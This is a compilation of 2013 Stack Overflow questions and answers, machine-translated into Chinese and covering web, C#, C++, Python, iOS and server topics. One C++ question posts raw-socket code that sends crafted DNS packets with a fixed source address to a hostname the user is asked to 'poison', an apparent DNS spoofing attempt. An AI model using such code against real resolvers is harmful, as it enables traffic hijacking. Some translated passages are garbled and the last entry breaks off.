> 赞同：1
> 
> 时间：2013-03-20T19:44:26.883
> 
> 标签：c#, javascript, jquery, asp.net-mvc-3

对于我正在开发的 MVC 应用程序，我有一个可以填充多个子视图的视图，如下所示：

**部分视图**

```
@model SuperFoo

<!-- snip unimportant details... ->

@foreach(var current in Model.Items)
{
    @Html.Partial('_Item', current);
}

<!-- ...SNIP more useless details... -->

<script>
$(document).ready(function () {
    $('.add-item').click(function () {
        // Make some AJAX call to do something.
    });
});
</script> 
```

**个别项目部分**

```
@model Foo

<div class='some-styling'>
   @Html.HiddenFor(m => m.Name)
   @Html.HiddenFor(m => m.PropA)
   @Html.HiddenFor(m => m.PropN)

   <input type='text' value='' />
   <a href='javascript:;' class='no-line add-item'>Add To Cart</a>
</div> 
```

我试图弄清楚两件事：

**A）**我如何确保只有我点击的特定按钮触发它的事件，以及

**B)**我如何使用针对特定项目获得的信息的特定信息？如果您注意到，我的项目级别视图中有一个可编辑的输入字段。触发点击时，生成的 AJAX 调用需要使用该文本框中的值（这是最简单的部分，`$('selector').val()`）

我只使用 jQuery 和 MVC3。问题（可能是一个愚蠢的问题，但我们会看到）：我的个人添加项目链接如何使用呈现它们的部分上下文进行操作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:59:41.480

您确实意识到在页面完全呈现后没有隔离，例如`partial view`只是为了管理您的代码，我没有完全理解您的问题，但我会尝试

回答 A

```
$('.add-item).click(function (e) {
  e.preventDefault();// prevent the default behavior of the anchor
  this; //is your friend, it will give you the DOM element which is clicked
  $(this); // will give you the nicely wrapped jQuery object      
}); 
```

回答 B

> 我如何使用特定于为特定项目获得的信息的信息？

不知道你在这里问什么，但如果你包装你的物品，比如

```
<div class="item-wrap">
  <input type='text' value='10'/>
  <a href=#' class='no-line add-item'>Add To Cart</a>
</div>

<div class="item-wrap">
  <input type='text' value='20'/>
  <a href='#' class='no-line add-item'>Add To Cart</a>
</div> 
```

然后在点击处理程序中

```
$('.add-item).click(function () {
       var $this = $(this);
       var $val = $this.closest(':input').val();
       //will give you 20 or 30 depending upon which one you click

       //or
        var $$val = $this.closest('.item-wrap>:input').val();

      //you can write a variety of selectors which can vary in perf 

    }); 
```

# java - Spring 3 和 NTLM 身份验证

> ID：15533226
> 
> 赞同：7
> 
> 时间：2013-03-20T19:44:37.583
> 
> 标签：java, spring, spring-security, ntlm

我正在使用 Spring 3 Web 应用程序，因为 Spring 3 不支持 NTLM 身份验证，还有哪些可以与 Spring 安全性一起使用的其他替代方案？这样用户在登录 Active Directory 时就可以通过应用程序进行身份验证？

Kerberos 解决方案目前不是一个选项，NTLM 是唯一的选项。

任何帮助都是非常可观的。

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-21T06:43:00.917

解决问题的最简单方法如下：

1) 安装 Apache Web Server 并使用 modntlm 配置使用 NTLM 身份验证

[http://modntlm.sourceforge.net/ （类似地，您可以使用](http://modntlm.sourceforge.net/)[http://modauthkerb.sourceforge.net/](http://modauthkerb.sourceforge.net/) 使用 mod_auth_kerb 使用 Kerberos 身份验证）

2) 将 mod_jk 配置到您的 Selvlet 容器（JBoss 或 Tomcat） [http://tomcat.apache.org/connectors-doc/generic_howto/proxy.html](http://tomcat.apache.org/connectors-doc/generic_howto/proxy.html) 成功验证后，Apache 将 REMOTE_USER 标头发送到 servlet 容器。标头（根据名称）包含经过身份验证的用户的用户名确保您配置 tomcatAuthentication="false" 以允许 Apache 允许 apache 发送 REMOTE_USER 标头

3）在Spring Security中实现和配置你自己的PreAuthenticatedProcessingFilter： [http](http://static.springsource.org/spring-security/site/docs/3.1.x/reference/springsecurity-single.html#d0e6167) ://static.springsource.org/spring-security/site/docs/3.1.x/reference/springsecurity-single.html#d0e6167 应该很类似Request-Header Authentication filter： [http](http://static.springsource.org/spring-security/site/docs/3.1.x/reference/springsecurity-single.html#d0e6295) ://static.springsource.org/spring-security/site/docs/3.1.x/reference/springsecurity-single.html#d0e6295 另外，用户名中应该省略域名. 用户名在 NTLM 或 Kerberos 身份验证后在 REMOTE_USER 标头中发送。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-02-17T23:45:59.770

Waffle 是可与 springsecurity 一起使用的解决方案，以实现此目的： [https ://github.com/dblock/waffle](https://github.com/dblock/waffle)

我自己用过它，例如 hybris。他们有一些例子。注意使用 jna3.5 的 1.5 版本可能会导致高负载问题另外请注意，如果我们的应用程序需要进行授权，您可能需要扩展协商安全过滤器（我必须这样做，可能在 1.6 中修复。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-20T22:57:34.020

我做过一次。[在这里](https://github.com/michail-nikolaev/springsecurity3-activedirectory-ntlm-test)抓住它。它需要在 AD 级别进行一些小的设置。随时在这里或在 github 上提问。

# c++ - 原始 UDP 套接字卡在 recvfrom 上

> ID：15533227
> 
> 赞同：2
> 
> 时间：2013-03-20T19:44:38.723
> 
> 标签：c++, c, sockets

我正在通过原始套接字发送 dns 数据包（A 型）。我从我的默认 DNS 服务器得到了很好的结果问题是我的代码卡在“recvfrom”中，我可以看到传出的请求数据包和通过 wireshark 的传入答案（没有错误）。我尝试了各种操作，例如使用不同的套接字来传出和传入数据包，尝试“recv”……但似乎没有任何效果。我将不胜感激。

```
int main() {
char hostname[100];

//Get the DNS servers from the resolv.conf file
get_dns_servers();
struct sockaddr_in sin;
// dest
sin.sin_family = AF_INET;
sin.sin_port = htons (53);
sin.sin_addr.s_addr = inet_addr (dns_servers[0]);

//Get the hostname from the terminal
cout << "\nEnter Hostname to Poison : ";
scanf("%s" , hostname);

//Create a raw socket of type IPPROTO
int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);

if(s == -1)
{
    //socket creation failed, may be because of non-root privileges
    perror("Failed to create raw socket");
    exit(1);
}

dns_packet *pak = new dns_packet("192.168.203.128",(uint16_t) 50115,(in_addr_t) sin.sin_addr.s_addr, (in_port_t) sin.sin_port, (int) 3333, hostname);

//Send the packet
if (sendto (s, pak->datagram, pak->iph->tot_len ,   0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
{
    perror("sendto failed");
}
//Data send successfully
else
{
    printf ("Packet Send. Length : %d \n" , pak->iph->tot_len);
}

//Receive the answer
int i = sizeof(sin);
unsigned char buf[65536];

cout << "\nReceiving answer..." << endl;
if(recvfrom (s,(char*)buf , sizeof(buf) , 0 , (struct sockaddr*)&sin , (socklen_t*)&i ) < 0)
{
    perror("recvfrom failed");
}

read_answer(buf);

return 0; 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T21:29:43.840

在您的代码中没有调用绑定。您需要绑定到接口才能接收任何内容。

编辑：另外，我注意到您使用的是原始套接字。使用原始套接字时，通常使用 recvmsg() 而不是 recvfrom() 更容易。这是 recvmsg() 的链接：http: [//www.developer.nokia.com/Community/Wiki/Open_C_Sockets :_recv,_recvfrom,_recvmsg_methods](http://www.developer.nokia.com/Community/Wiki/Open_C_Sockets:_recv,_recvfrom,_recvmsg_methods)

# ios - 将“通过 iOS 共享”更改为“通过共享

> ID：15533232
> 
> 赞同：0
> 
> 时间：2013-03-20T19:44:46.893
> 
> 标签：ios, facebook, sharing, slcomposeviewcontroller

我正在使用 SLComposeViewController 发布到 facebook。然而，所有这些帖子都有一个“通过 iOS 共享”标签，而不是“通过我的应用名称共享”。知道如何解决这个问题吗？ [此处的堆栈溢出帖子](https://stackoverflow.com/questions/12547616/sharing-with-ios-6-0-native-facebook-integration-posted-via-my-app-name/12605241#12605241)指出，这可以通过联系开发人员关系来完成。这真的是最简单的方法吗？我该怎么做？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T04:11:28.153

[根据这个答案https://stackoverflow.com/a/12605241/801913](https://stackoverflow.com/a/12605241/801913)看起来这是一个手动过程，需要联系 Facebook 来完成（或 Facebook 应用程序需要在 Facebook 应用程序商店上发布）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-29T18:08:28.230

[Facebook 的分享对话框的文档](https://developers.facebook.com/docs/howtos/share-dialogs-ios-sdk/)在这里给出了一个比较明确的答案。您必须联系 Facebook 以更改默认的“通过 iOS 共享”。我不确定联系 facebook 的最佳方式是什么，但幸运的是，文档描述了一些更改帖子归属的替代方法。如果您使用 Facebook 的分享对话框或提要对话框，则帖子将归因于您的应用程序而不是 iOS。

# r - 在数据框的行中添加每个第 n 个值

> ID：15533233
> 
> 赞同：2
> 
> 时间：2013-03-20T19:44:51.880
> 
> 标签：r

这应该很容易，但我很难过。我知道我可以循环执行此操作，但应该更容易。

我想逐行添加数据框中每第三列的值。因此，如果我有一个包含 10 列的数据框，我想添加第 1 列和第 4 列、第 2 列和第 5 列、第 3 列和第 6 列等，直到我到达第 7 列（添加到第 10 列）。这是为每一行完成的。

我无法让各种聚合函数（例如 rowsum、apply）正确执行此操作。

下面的示例数据框

```
x = c(1,2,3,4,5,6,7,8,9,10)
y = c(2,4,6,8,10,12,14,16,18,20)
z = c(3,6,9,12,15,18,21,24,27,30)
all = as.data.frame(rbind(x,y,z)) 
```

因此，x 的结果应该是 5,7,9,11,13,15,17。y 的结果是 10、14、18、22、26、30、34 等。

# android - 如何监听 UserDictionary ContentProvider 的变化？

> ID：15533236
> 
> 赞同：0
> 
> 时间：2013-03-20T19:45:20.803
> 
> 标签：android, textview

我已经为 ICS/JB 实现了拼写检查器。SpellingCheckerService.Session 让我在您按下拼写错误的单词（红色下划线）时出现的弹出菜单中设置建议，但在用户按下“添加到词典”时不会通知我。它只是将它添加到 Android 用户字典中，因此我的拼写检查器会继续将该单词报告为拼写错误。

我可以经常查询用户字典，但这非常低效，尤其是因为菜单打开时我什至都没有收到通知。

有没有办法监听 UserDictionary 的变化，它是一个系统 ContentProvider？更好的是，有没有办法在用户按下“添加到字典”时得到通知？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T22:01:06.393

您应该能够在[UserDisctionary.CONTENT_URI](http://developer.android.com/reference/android/content/ContentResolver.html#registerContentObserver%28android.net.Uri,%20boolean,%20android.database.ContentObserver%29)上设置[ContentObserver](http://developer.android.com/reference/android/provider/UserDictionary.Words.html#CONTENT_URI)并获得更改通知。

# excel - 根据第一列中数据的比较将数据从工作表复制到另一个工作表

> ID：15533238
> 
> 赞同：0
> 
> 时间：2013-03-20T19:45:27.620
> 
> 标签：excel, excel-formula, vba

我有一个带有两张表（Sheet1 和 Sheet2）的 Excel 文件。在Sheet1中我有如下数据： [http://i47.tinypic.com/2qulksn.jpg](http://i47.tinypic.com/2qulksn.jpg) 在Sheet2中我有如下数据（行数不同，名称顺序已更改，其他列为空） : [http://i48.tinypic.com/15gxkev.jpg](http://i48.tinypic.com/15gxkev.jpg)

我想做的是将Sheet2与Sheet1进行比较，查看第一列，当名称匹配时，将整行从Sheet1复制到Sheet2。当没有匹配项时什么都不做，即让 New Person 保持原样。

对不起，我不知道 VB 开始编写您可以更正的脚本。提前感谢您的所有回复。

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T01:30:18.710

请使用excel的Vlookup功能。

![在此处输入图像描述](../Images/c4a132c24126120a2227a54e5291befa.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T23:29:18.283

不需要 VB 脚本。`=vlookup($A2,Sheet1!$A$1:$E$11,column())`在 Sheet2!B2 中尝试。

细分： vlookup( `lookup value with $ on column only so the row updates as you drag down`, `array on sheet1 that you are looking up on - this will change depending on your data table`, `column() will output the column number thereby giving the column in your array you want to output - will only work if the data headings and cell locations are the exact same`)

# mpi - MPI_Allgather 通信复杂性

> ID：15533242
> 
> 赞同：0
> 
> 时间：2013-03-20T19:45:30.657
> 
> 标签：mpi, time-complexity

我需要了解 MPI_Allgather 在数组大小 (n) 和处理器数量 (p) 方面的通信复杂性。我在一个演示文稿中发现复杂性是 $O(\log p + n)$ 但找不到任何要引用的参考资料。你能给我一些文章，我可以在其中包含通信复杂性。

谢谢。

# javascript - CSS/JavaScript 溢出 Chrome 错误？

> ID：15533244
> 
> 赞同：1
> 
> 时间：2013-03-20T19:45:38.283
> 
> 标签：javascript, jquery, css

我很绝望。我正在尝试制作自定义表单样式 JS，这一切都完美无缺，除了我遇到了这个错误（仅在 Chrome 中）。

[http://i.imgur.com/wv2pTY6.png](http://i.imgur.com/wv2pTY6.png) [http://i.imgur.com/fKyxeL2.png](http://i.imgur.com/fKyxeL2.png)

当您单击选择两次，或者在加载时单击列表，它会跳到左边。

只有 Chrome 这样做，其他浏览器似乎还可以。有任何想法吗？我试图解决这个问题 3 个小时没有成功......

当我在包含输入的 DIV 上放置“溢出：隐藏”时，问题不会发生......列表是绝对定位的，所以我不明白为什么它与周围元素交互......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T19:52:04.293

将表格宽度增加到 250 像素（限制宽度为 199 像素）。它的发生是因为表在某个时间点不能包含选择控件，因此它会下降。由于某种原因（很可能是 CSS），表格宽度减少了 2px，因此选择字段折叠。有一些额外的宽度来避免这种情况。

# python - 使用 Python 和 matplotlib 控制 3D 散点图上的 alpha 值

> ID：15533246
> 
> 赞同：18
> 
> 时间：2013-03-20T19:45:42.113
> 
> 标签：python, numpy, matplotlib

我正在使用函数 scatter 和 mplot3d 绘制 3D 散点图。我为图中的所有点选择一种颜色，但是当由 matplotlib 绘制时，点的透明度是相对于与相机的距离设置的。有什么办法可以禁用此功能？

我尝试将 alpha kwarg 设置为 None/1 并将 vmin/vmax 设置为 1（试图强制颜色缩放为纯单色），但没有成功。我在 scatter 文档中没有看到与此设置相关的任何其他可能选项。

谢谢！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-21T06:28:31.340

**对于 Matplotlib 1.4+，@fraxel 下面提供的答案是最佳解决方案：`ax.scatter`使用参数调用`depthshade=False`。**

没有任何论据可以控制这一点。这是一些黑客方法。

禁用`set_edgecolors`和`set_facecolors`方法，使 mplot3d 无法更新颜色的 alpha 部分：

```
from mpl_toolkits.mplot3d import Axes3D
import numpy as np
import matplotlib.pyplot as plt

fig = plt.figure()
ax = fig.gca(projection='3d')

x = np.random.sample(20)
y = np.random.sample(20)
z = np.random.sample(20)
s = ax.scatter(x, y, z, c="r")
s.set_edgecolors = s.set_facecolors = lambda *args:None

ax.legend()
ax.set_xlim3d(0, 1)
ax.set_ylim3d(0, 1)
ax.set_zlim3d(0, 1)

plt.show() 
```

![在此处输入图像描述](../Images/2f6710ccb92efa0564be6a93fa3aabae.png)

如果你以后想要调用`set_edgecolors`和`set_facecolors`方法，你可以在禁用它们之前备份这两个方法：

```
s._set_facecolors, s._set_edgecolors = s.set_facecolors, s.set_edgecolors 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2016-02-02T15:28:15.057

```
ax.scatter(x, y, z, depthshade=0) 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-09-16T02:29:13.470

如果只想禁用 alpha 调整，可以覆盖 zalpha 函数。这将允许您在交互式绘图的情况下更新颜色并仍然消除深度雾。

```
from mpl_toolkits.mplot3d import *
import numpy as np
import matplotlib.pyplot as plt
plt.ion()

art3d.zalpha = lambda *args:args[0]

fig = plt.figure()
ax = fig.gca(projection='3d')

x = np.random.sample(20)
y = np.random.sample(20)
z = np.random.sample(20)
s = ax.scatter(x, y, z, c="r")

ax.legend()
ax.set_xlim3d(0, 1)
ax.set_ylim3d(0, 1)
ax.set_zlim3d(0, 1)

plt.show() 
```

# google-app-engine - 超出软专用内存限制

> ID：15533248
> 
> 赞同：5
> 
> 时间：2013-03-20T19:45:45.463
> 
> 标签：google-app-engine, memory-leaks, google-cloud-datastore, go

我们对 gae go 的体验很糟糕。当我们的应用程序是免费应用程序时，我们从来没有遇到过**Exceeded soft private memory limit**的问题。我们超过了配额，因此我们决定付款。我们的每日预算设置为 3 美元。激活付费服务后，我们可以再次使用该站点，并且超出配额的情况消失了。几个小时后，我们得到了**超过软私有内存限制**，除此之外什么都看不到。我试图清除数据存储中的一些大数据，禁用内置插件，但仍然没有运气。

我在代码中做了一些测试，以确定故障的来源。删除数据存储访问代码，使站点再次启动。所以我的结论是访问数据存储即使只是为了获取很少的实体也会引发这样的错误。我们有点绝望了。我们选择使用 apppot 来利用该技术，但我们得到了这个，因为我们无法继续进行开发。

以下只是引发此类错误的代码。

```
q := datastore.NewQuery("Course")
    courses := make([]courseData, 0)
    if keys, err := q.GetAll(c, &courses); err != nil {
        http.Error(w, err.Error(), http.StatusInternalServerError)
        return
    } else {
      for i := range courses {                 
          courses[i].Key = keys[i]
      }                           
    } 
```

您可以向我们提供的任何帮助将不胜感激。先感谢您。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-07T21:53:01.623

根据我的经验，此消息通常意味着您的实例使用的内存比您的实例类支持的更多。如果您开始收到此消息，请升级到下一个实例类（F2 等）并查看它是否消失。这是您在模块配置文件中所做的更改（以前位于管理控制台的应用程序设置部分）。问题很可能会消失，除非您使用的内存比下一个类可以支持的更多。

与自动扩展到您的预算限制的其他资源不同，RAM 不是；如果请求导致实例超出其实例类的 RAM 限制，则实例将在请求结束时终止并记录此消息。

# c# - 如何在c#中随机选择一个字符串

> ID：15533250
> 
> 赞同：0
> 
> 时间：2013-03-20T19:45:49.477
> 
> 标签：c#, arrays, string, visual-studio-2010

我正在写一个简单的语言翻译器，它会呈现英文单词并询问相应的外来词。到目前为止，代码将从数组中选择一个随机词，但是我现在正试图让它从列表中选择相应的外来词。这是到目前为止的代码：

```
public class Words
    {
        public int spanishindex; 
        string[] EnglishWords = { "Yellow", "Yello", "Yelow", "Yllow", "ellow" };
        string[] SpanishWords= { "giallo", "giall", "iallo", "gllo", "lo" };

        public String GetRandomWord()
        {
            Random randomizer = new Random();
            index = randomizer.Next(EnglishWords.Length);
            string randomword = EnglishWords[randomizer.Next(index)];
            spanishindex= index;
            return randomword;
        }

        public String MatchSpanishWord()
        {
            string matchword = SpanishWords[spanishindex];
            return matchword;
        }
    } 
```

我的想法是通过在 MatchSpanishWord 方法中传入与随机值相反的索引值，我会得到相应的单词（因为列表是按顺序排列的）

因此，如果选择了“ellow”，则对应的西班牙语应该是“lo”

任何帮助将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T19:51:24.740

问题是您调用了 random 两次：一次生成随机索引，然后再次生成数组索引。我在下面的代码中修复了您的错误：

```
public class Words
{
    public int spanishindex; 
    string[] EnglishWords = { "Yellow", "Yello", "Yelow", "Yllow", "ellow" };
    string[] SpanishWords= { "giallo", "giall", "iallo", "gllo", "lo" };

    public String GetRandomWord()
    {
        Random randomizer = new Random();
        index = randomizer.Next(EnglishWords.Length);
        string randomword = EnglishWords[index]; //<---- this is the fix
        spanishindex= index;
        return randomword;
    }

    public String MatchSpanishWord()
    {
        string matchword = SpanishWords[spanishindex];
        return matchword;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T19:51:33.013

改变：

```
string randomword = EnglishWords[randomizer.Next(index)]; 
```

到

```
string randomword = EnglishWords[index]; 
```

...假设您不希望随机索引小于您已经随机找到的索引。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T19:51:35.390

你应该改变

```
 string randomword = EnglishWords[randomizer.Next(index)]; 
```

到

```
 string randomword = EnglishWords[index]; 
```

# c++ - SFML 在 mac 上给了我未知的符号

> ID：15533251
> 
> 赞同：0
> 
> 时间：2013-03-20T19:45:50.003
> 
> 标签：c++, gcc, symbols, sfml

我使用指令编译 SFML2，使其在 mac 上与 C++11 一起工作，方法是在 cmake 中添加标志。

每当我尝试使用 Eclipse 作为我的 IDE 的库时，我得到未知符号，它使用的命令如下：

```
g++-4.7 -L/usr/local/lib -std=c++11 -o "Breakout"  ./main.o   -lsfml-window -lsfml-system -lsfml-graphics 
```

它吐出的错误是：

```
Undefined symbols for architecture x86_64:
"sf::RenderWindow::RenderWindow(sf::VideoMode, std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, unsigned int, sf::ContextSettings const&)", referenced from:
  _main in main.o 
```

使用此代码：

```
#include <SFML/Graphics.hpp>

int main () {
    sf::RenderWindow window(sf::VideoMode(800,600), "window");
    return 1;
} 
```

我认为问题可能是 SFML 是用 Clang 编译的，而我使用的是 GCC 4.7。我无法使用 GCC 编译 SFML，因为它抱怨 Objective C 和 Cocoa 的东西。如果我可以避免它，我不想为这个项目改用 Clang，因为我喜欢 Eclipse 作为 IDE，但 Clang 支持是废话。

编辑：我差点忘了，Linux 上一切正常。我有一个正在移植的项目，我正在尝试制作一个突破性克隆来测试。我已经有的项目很大，我想尽可能避免工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:58:17.690

我想出了一个解决办法。如果我使用 SFML 网站上的预编译库，它编译得很好。我现在的问题是，为什么？它们的行为相同，我认为它们是使用相同的方法编译的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:33:00.237

要使用 C++11 支持编译 SFML，您需要两个工具（如入门教程中所述）：clang*和*libc++。

Libc++ 和 libstdc++ 有两种不同的 S(T)L 实现。这就是这里的问题。

不幸的是，没有神奇的解决方案；你要么使用没有 C++11 的 SFML，要么使用 g++ 4.7 和 C++11 支持编译 SFML。当然，您也可以使用其他 IDE。

请注意，SFML 不会正式支持非官方编译器。但是，欢迎您尝试一下，并在官方论坛上分享您的经验。

# linux - Bash 脚本适用于 ssh 但不适用于 php

> ID：15533257
> 
> 赞同：0
> 
> 时间：2013-03-20T19:46:12.790
> 
> 标签：linux, bash, ssh, debian

我有一个 bash 脚本（myscript.sh），它在用户“www-data”的 ssh 控制台上工作，但是当我在我的 php 脚本中使用“exec”运行这个脚本时，脚本不起作用。

有什么问题？“www-data”具有外壳“/bin/bash”，当我设置为“/bin/sh”时，脚本也不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T23:13:11.930

我知道这样做有一种“不安全”的方式，我曾经遇到过类似的问题，您也可以更改文件的所有权限 - 在命令行类型：

首先复制您的原始文件 - 以防万一，所以我们不会进一步搞砸：

```
 cp myscript.sh myscript2.sh

    chmod 755 myscript2.sh 
```

并在命令行类型：

```
 chown www-data:www-data myscript2.sh 
```

在 PHP 脚本文件中尝试使用 myscript2。（我记得还发现与此类似的问题与以 root 身份运行 Web 服务器（我假设您使用 Apache）有关。）

顺便说一句，你看过你的错误日志吗？对于不允许的内容，可能会有有用的建议。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:00:25.640

注意可执行模式

```
chmod +x myscript.sh 
```

如果脚本在路径中。否则调用 myscript.sh 时使用完整路径

# c++ - 编译器会优化这个还是我需要分配？

> ID：15533258
> 
> 赞同：0
> 
> 时间：2013-03-20T19:46:13.213
> 
> 标签：c++, optimization

如果我在 for 循环中有一个对于循环的所有迭代都相同的方法调用 - 编译器是否足够聪明来优化它？

```
 for (int j = 0; j < 24; j++ ) {
        *destinationPointer++ = identityArray[j] * (1 / powf(2, valueFromAboveInMethod));
 } 
```

还是我应该明确并在循环之前将其分配给一个值？

```
 float value = 1 / powf(2, valueFromAboveInMethod);

 // populate the array
 for (int j = 0; j < 24; j++ ) {
        *destinationPointer++ = identityArray[j] * value;
 } 
```

如果编译器在这里做了一些很棒的事情并且我不必为浮点数使用 4 个字节，我会更高兴——这是在递归方法中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:07:54.413

我个人会在这里使用一个变量。不仅因为它可以提供更好的代码，还因为它向任何阅读代码的人表明值不会改变[但是我会给它一个比“值”更好的变量名]。我确实希望编译器实际预先计算该值，但正如已经提到的，它确实依赖于编译器对`powf`纯函数的理解（没有副作用并且每次对相同的输入给出相同的结果）。

在递归调用中使用额外变量而导致的任何额外存储要么是“好吧，没关系”，要么是“你正在玩非常接近堆栈溢出深渊的边缘”。堆栈溢出可能是最严重的崩溃类型之一，因为它绝对没有提供任何警告或恢复方法，因为程序需要使用堆栈来恢复，而且它很可能是唯一可用的堆栈溢出......如果你递归函数要么是无限的，要么你不能保证递归调用的数量在堆栈的限制范围内，那么我建议你应该重新设计这个函数。深度递归通常是非常低效的，而且它'

-- 垫子

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T19:48:40.030

这取决于你用什么选项编译它。通常，即使启用了最小优化，编译器也会处理这种简单的优化，但是最好像您在第二个代码中编写的那样自己做。无论如何，如果编译器会优化它，它也会保留`additional 4 bytes`，因为值需要存储在任何地方。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T19:58:51.043

编译器可能不够聪明，无法实现 powf 是无状态的。

如有疑问，请编译为汇编程序并自行检查。

# magento - 编辑 app/etc/local.xml 文件后如何修复 Magento？

> ID：15533261
> 
> 赞同：0
> 
> 时间：2013-03-20T19:46:16.493
> 
> 标签：magento

我需要帮助。我将一段代码添加到文件 app/etc/local.xml 并保存并运行我的网站，但现在它无法工作。（这是我添加的代码。）[在 Magento 中更改联系表单的列布局](https://stackoverflow.com/questions/3314540/change-column-layout-of-contact-form-in-magento)。我只是撤消了更改，但该站点仍然无法正常工作。任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:34:34.483

您向文件添加了布局 XML 更新`app/etc/local.xml`，用于更新全局配置树。这些是独立的系统。

您持续错误的最可能的罪魁祸首是 Magento 缓存了全局配置树。如果您正在运行股票 Magento，请清除中的所有文件

```
var/cache/* 
```

并重新加载页面。你应该很好去追求。

如果问题仍然存在，请通过您的错误日志查找 Magento 正在抛出的确切错误，并让我们知道它是什么。如果有人知道这些信息，他们应该能够帮助您。

# ios - iOS AVCaptureVideoPreviewLayer 未在 UIView 中显示？

> ID：15533264
> 
> 赞同：11
> 
> 时间：2013-03-20T19:46:24.057
> 
> 标签：ios, objective-c, xcode, video, avfoundation

### 问题

我有一个[来自 Apple (SquareCam) 的示例应用程序](https://developer.apple.com/library/ios/#samplecode/SquareCam/Introduction/Intro.html#//apple_ref/doc/uid/DTS40011190)，我将其用作为相机创建自定义界面的参考。我正在使用 AVFoundation 框架。如果我从 Apple 构建并运行该项目，该应用程序将按预期运行。但是，如果我从该项目中获取相同的代码并将其放在 Xcode 中的新项目中，则不会显示视频预览。

我已将代码简化为运行视频预览层的基本组件。同样，此代码在 Apple (SquareCam) 项目中运行良好，但未显示在我的新项目中。

### 编码

```
- (void)setupAVCapture {
    NSError *error = nil;

    AVCaptureSession *session = [AVCaptureSession new];
    if ([[UIDevice currentDevice] userInterfaceIdiom] == UIUserInterfaceIdiomPhone)
        [session setSessionPreset:AVCaptureSessionPreset640x480];
    else
        [session setSessionPreset:AVCaptureSessionPresetPhoto];

    // Select a video device, make an input
    AVCaptureDevice *device = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    AVCaptureDeviceInput *deviceInput = [AVCaptureDeviceInput deviceInputWithDevice:device error:&error];

    if ([session canAddInput:deviceInput])
        [session addInput:deviceInput];

    previewLayer = [[AVCaptureVideoPreviewLayer alloc] initWithSession:session];
    [previewLayer setBackgroundColor:[[UIColor blackColor] CGColor]];
    [previewLayer setVideoGravity:AVLayerVideoGravityResizeAspect];
    CALayer *rootLayer = [previewView layer];
    [rootLayer setMasksToBounds:YES];
    [previewLayer setFrame:[rootLayer bounds]];
    [rootLayer addSublayer:previewLayer];
    [session startRunning];
}

- (void)viewDidLoad {
    [super viewDidLoad];
    [self setupAVCapture];
} 
```

### 我尝试了什么？

我已正确设置所有网点。我在构建阶段拥有所有框架库。这两个项目都使用故事板。奇怪的是，我能够从相机捕捉图像，甚至可以将源从前切换到后。但不会显示预览。Apple 项目未使用 ARC 设置。所以，我更新了项目以使用 ARC。同样，在 Apple 项目中运行良好，但在新项目中却没有。

### 想法？

关于问题可能是什么的任何想法？是否有可能导致这种情况的项目设置？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2013-09-25T21:39:01.410

有同样的问题，关键是将`AVCaptureVideoPreviewLayer`' 框架设置为 UIView 的边界：

```
// Setup camera preview image
AVCaptureVideoPreviewLayer *previewLayer = [AVCaptureVideoPreviewLayer layerWithSession:_captureSession];
previewLayer.frame = _cameraPreview.bounds;
[_cameraPreview.layer addSublayer:previewLayer]; 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-20T21:39:23.553

我的项目中有类似的问题。从您的代码摘录中，很难判断谁在调用 setupAVCapture 方法。就我而言，我必须确保在主线程上创建 AVCaptureVideoPreviewLayer。

有几个选项。您可以通过将调用包装在以下块中来在主应用程序线程上调用 setupAVCapture：

```
dispatch_async(dispatch_get_main_queue(), ^{
   // call setupAVCapture() method in here
}); 
```

如果这不是一个选项，您只能在代码的以下部分执行此操作：

```
 dispatch_async(dispatch_get_main_queue(), ^{
    previewLayer = [[AVCaptureVideoPreviewLayer alloc] initWithSession:session];
    [previewLayer setBackgroundColor:[[UIColor blackColor] CGColor]];
    [previewLayer setVideoGravity:AVLayerVideoGravityResizeAspect];
    CALayer *rootLayer = [previewView layer];
    [rootLayer setMasksToBounds:YES];
    [previewLayer setFrame:[rootLayer bounds]];
    [rootLayer addSublayer:previewLayer];
   }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-08-04T11:29:55.993

在主线程上设置框架非常重要。

斯威夫特 5

```
let previewLayer = AVCaptureVideoPreviewLayer(session: captureSession)
previewLayer.videoGravity = .resizeAspectFill
layer.addSublayer(previewLayer)
DispatchQueue.main.async {
  previewLayer.frame = self.bounds
} 
```

# c# - 将 dbml 更改为 bigint 是否适用于 int 值

> ID：15533269
> 
> 赞同：2
> 
> 时间：2013-03-20T19:46:31.377
> 
> 标签：c#, linq-to-sql

